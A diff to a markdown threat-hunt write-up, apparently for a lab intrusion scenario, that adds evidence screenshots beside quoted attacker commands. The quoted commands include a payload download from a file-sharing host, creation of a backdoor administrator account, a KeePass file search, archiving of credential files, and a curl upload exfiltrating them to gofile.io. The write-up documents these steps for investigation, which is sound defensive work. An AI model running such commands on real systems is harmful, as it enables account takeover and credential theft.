@@ -82,6 +82,7 @@ curl.exe -L -o KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
 ```
 \Device\NamedPipe\msf-pipe-5902
 ```
+<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Named_pipe_msf.png" />
 
 * Confirms Metasploit usage
 
@@ -92,18 +93,34 @@ curl.exe -L -o KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
 net user yuki.tanaka2 B@ckd00r2024! /add
 net localgroup Administrators yuki.tanaka2 /add
 ```
+<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Privilege_escalation_administrators_group1.png" />
+
+**Cyber Chef decoded base64 commands**
+* New account added
+
+  <img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Base64_decoded_privilege_escalation_command.png" />
+  
+* Account added to the administrators group (privilege escalation)
+  
+ <img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Cyber_Chef_decoded_command.png" /> 
+
 **Credential & Data Discovery**
 
 KeePass enumeration:
 ```
 cmd.exe /c where /r C:\Users *.kdbx
 ```
+<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Credential_enumeration_kdbx.png" />
 
 * Sensitive files accessed:
 
   * OLD-Password.txt
+    
+<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/credential-theft/OLD_Password_text.png" />
 
   * Banking records
+
+<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Banking_documents_copied.png" />
 
 **Data Staging**
 
@@ -113,6 +130,7 @@ cmd.exe /c where /r C:\Users *.kdbx
 C:\ProgramData\Microsoft\Crypto\staging
 ```
 
+<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/staging/Staging_directory_path.png" />
 
 * Data copied:
 
@@ -129,12 +147,14 @@ Archive created:
 tar.exe -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt
 ```
 
+<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/credential-theft/Master_password_extracted.png" />
+
 * Exfiltration:
 
 ```
 curl.exe -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
 ```
-
+<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/exfiltration/gofile-exfill.png" />
 
 * **Destination IP**: 45.112.123.227
 
